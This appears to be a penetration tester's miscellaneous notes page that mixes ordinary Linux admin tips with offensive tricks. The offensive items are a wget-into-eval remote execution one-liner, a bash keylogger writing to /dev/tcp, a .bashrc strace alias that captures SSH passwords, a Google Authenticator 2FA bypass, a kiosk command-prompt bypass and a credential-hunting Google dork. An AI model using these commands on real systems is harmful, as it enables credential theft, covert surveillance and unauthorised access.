# Random

### .DS\_STORE Files

* If you find a .DS\_STORE file on a webserver you can reconstruct the directory contents without having to fuzz all the directories
* &#x20;[https://iam0xc4t.medium.com/extract-file-from-ds-store-815a22542da9](https://iam0xc4t.medium.com/extract-file-from-ds-store-815a22542da9)
* [https://github.com/lijiejie/ds\_store\_exp](https://github.com/lijiejie/ds_store_exp)
* A better alternative I have used in the past
* [https://github.com/Keramas/DS\_Walk.git](https://github.com/Keramas/DS_Walk.git)

```
python3 ds_walk.py --url http://10.13.38.11                                                  ✭master 
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://10.13.38.11/admin
[!] http://10.13.38.11/dev
[!] http://10.13.38.11/iisstart.htm
[!] http://10.13.38.11/Images
[!] http://10.13.38.11/JS
[!] http://10.13.38.11/META-INF
[!] http://10.13.38.11/New folder
[!] http://10.13.38.11/New folder (2)
[!] http://10.13.38.11/Plugins
[!] http://10.13.38.11/Templates
[!] http://10.13.38.11/Themes
[!] http://10.13.38.11/Uploads
[!] http://10.13.38.11/web.config
[!] http://10.13.38.11/Widgets
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://10.13.38.11/Images/buttons
[!] http://10.13.38.11/Images/icons
[!] http://10.13.38.11/Images/iisstart.png
----------------------------
[!] http://10.13.38.11/JS/custom
----------------------------
[!] http://10.13.38.11/Themes/default
----------------------------
[!] http://10.13.38.11/Widgets/CalendarEvents
[!] http://10.13.38.11/Widgets/Framework
[!] http://10.13.38.11/Widgets/Menu
[!] http://10.13.38.11/Widgets/Notifications
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts/custom
[!] http://10.13.38.11/Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk.
```

* If you are shortname scanning on IIS you can now create a wordlist based upon the .DS\_STORE output

```
./shortutil wordlist wordlist.txt > output.txt

cat output.txt                                                                        ✭main 
#SHORTSCAN#
AE53A05F6147AC49	NEWFOL		NEW FOLDER	
CCDBCA81CC7CCE4B	NEWFOL		NEW FOLDER (2)	
A8D81F6F8636	TEMPLA		TEMPLATES	
F502F316F71C	WEB	CON	WEB	CONFIG
12A9A774	304C0C		304C0C90FBC6520610ABBF378E2339D1	
3871D39DC9C1	DCA66D		DCA66D38FD916317687E1390A420C3FC	
CDE9C1DAD193	CALEND		CALENDAREVENTS	
001BB4092F53	FRAMEW		FRAMEWORK	
0C8AE4157ED7	NOTIFI		NOTIFICATIONS
```



### Stop Windows VMs from shutting down

* Windows enforces its licensing by shutting down Win Servers every hour. We at Hacknetics implore you to always follow the rules.&#x20;
* [https://digitalitskills.com/how-to-stop-windows-server-auto-shutdown-every-hour-after-license-expire/](https://digitalitskills.com/how-to-stop-windows-server-auto-shutdown-every-hour-after-license-expire/)

### Cool heredoc&#x20;

* Use when you are on a `/bin/sh` and need to `su` but dont want to go into a full `tty`

```
su - root <<!
Passw0rd
id
ls /root
!
Password: uid=0(root) gid=0(root) groups=0(root)
Desktop  Documents  Downloads  go  Music  Pictures  Public  Templates  thinclient_drives  Videos
```

### Bypass a disabled command prompt with /k

```
# Win+R (To bring up Run Box)
cmd.exe /k "whoami"
```

**Description:** _'This command prompt has been disabled by your administrator...' Can usually be seen in environments such as kiosks PCs, a quick hacky work around is to use /k via the windows run box. This will carry out the command and then show the restriction message, allowing for command execution._

### _Luks On USBs_

* [https://geekyshacklebolt.wordpress.com/2019/03/06/how-to-encrypt-usb-drives-with-luks/](https://geekyshacklebolt.wordpress.com/2019/03/06/how-to-encrypt-usb-drives-with-luks/)

### SSH Key Format Conversions

**Install putty-tools:**
```bash
sudo apt install putty-tools
```

**PPK to OpenSSH (Linux):**
```bash
puttygen key.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@target
```

**OpenSSH to PPK (Windows/Plink):**
```bash
puttygen id_rsa -o key.ppk
```

### Google Authenticator 2FA Bypass

If you gain access to a user's home directory containing `.google_authenticator`, you can bypass 2FA.

**File location:**
```
/home/username/.google_authenticator
```

**File contents:**
```
CLSSSMHYGLENX5HAIFBQ6L35UM    # Secret key (base32)
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
99852083                       # Emergency backup codes
20312647
73235136
92971994
86175591
```

**Using emergency backup codes:**
```bash
ssh user@target
(user@target) Verification code: 99852083   # Use any backup code
user@target:~$
```

**Generate TOTP codes with oathtool:**
```bash
# Install oathtool
sudo apt install oathtool

# Generate current TOTP code from secret
oathtool -b --totp 'CLSSSMHYGLENX5HAIFBQ6L35UM'
548476

# IMPORTANT: Ensure your system time matches the target machine!
```

---

### NTP Randomness&#x20;

* Set ntp based on specific server time.  Required for kerberos auth, match attacker box to the time of the domain controller

```
sudo timedatectl set-ntp off 
sudo date -s "28 NOV 2024 07:23:00Z"
```

* Restore NTP back to default

```
sudo timedatectl set-ntp on 
sudo ntpdate 192.168.1.1
```

### Bash In memory exec one liner&#x20;

```
bash -c CMD="`wget -qO- http://<ip>/script.sh`" && eval "$CMD"
```

### Bash Keylogger&#x20;

```
PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'
```

### SSH Client Strace Keylogger

* Poor mans keylogger for ssh client but it works. Add to the users `.bashrc`&#x20;

```
alias ssh='strace   -o   /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh' 
```

* remember to source the `.bashrc`
* `source ~/.bashrc`

### Apache map external drive to webroot

* Create a directory on the external HDD, assuming it is mounted under the `/media` directory, like so:

```
sudo mkdir /media/web_files
```

* Change the ownership of this directory and all the files under it to be owned by the Apache user `www-data` like so:

```
sudo chown -R www-data:www-data /media/web_files/
```

* Create a directory under the web root directory ie `/var/www/html/` like so:

```
sudo mkdir /var/www/html/external_files
```

* Bind the `/media/web_files/` directory to the `/var/www/html/external_files/` directory like so:

```
sudo mount --bind /media/web_files/ /var/www/html/external_files/
```

* All files on the external HDD under the `/media/web_files/` directory will be available for Apache under the `/var/www/html/external_files/` directory and you can link to them in your web page that resides in `/var/www/html/` like so:

```
<a href="external_files/file1.mp4">file1</a>
```

### Unzip a chunked archive

* you will see files ending in .001, .002 etc etc&#x20;
*   You will need to join them first. You may use the common linux app, `cat` as in the example below:

    ```
    cat test.zip* > ~/test.zip
    ```

    This will concatenate all of your `test.zip.001`, `test.zip.002`, etc files into one larger, test.zip file. Once you have that single file, you may run `unzip test.zip`

## [How to convert .mkv file into .mp4 file losslessly?](https://askubuntu.com/questions/50433/how-to-convert-mkv-file-into-mp4-file-losslessly)

```
ffmpeg -i input.mkv -codec copy output.mp4
```

### Cool Google Dorks&#x20;

```
inurl:/wp-content/uploads/ ext:txt "username" AND "password" | "pwd" | "pw"
```

### What is taking up space Linux

* I recently ran out of disk space on my Ubuntu machine, here is a quick way to see what is taking up all that space

```
root@dev:/opt# du -cha --max-depth=1 / 2>/dev/null | grep -E "M|G" 
3.9M	/run
19G	/opt
18M	/etc
18G	/home
18G	/usr
1.6G	/media
918M	/root
517M	/Kismet-20240630-21-57-41-1.kismet
11G	/snap
2.1G	/swapfile
145G	/tmp
7.3G	/var
194M	/boot
221G	/
221G	total
root@dev:/opt# cd /var
root@dev:/var# du -cha --max-depth=1 /var 2>/dev/null | grep -E "M|G" 
6.5G	/var/lib
6.5M	/var/backups
291M	/var/cache
99M	/var/crash
5.0M	/var/snap
427M	/var/log
7.3G	/var
7.3G	total
```

### Fix x11 graphical error

```
xhost +SI:localuser:root
xhost
```

### Fix Date Issue On Ubuntu

* I recently had severe time drift on a machine that is prevented from reaching the internet
* Provide the host internet access for a small time window and fix with a one liner

```
timedatectl
               Local time: Thu 2024-11-21 03:43:31 EST
           Universal time: Thu 2024-11-21 08:43:31 UTC
                 RTC time: Fri 2014-09-05 09:12:41
                Time zone: America/New_York (EST, -0500)
System clock synchronized: no
              NTP service: active
          RTC in local TZ: no
sudo date -s "$(wget -qSO- --max-redirect=0 google.com 2>&1 | grep Date: | cut -d' ' -f5-8)Z"

```
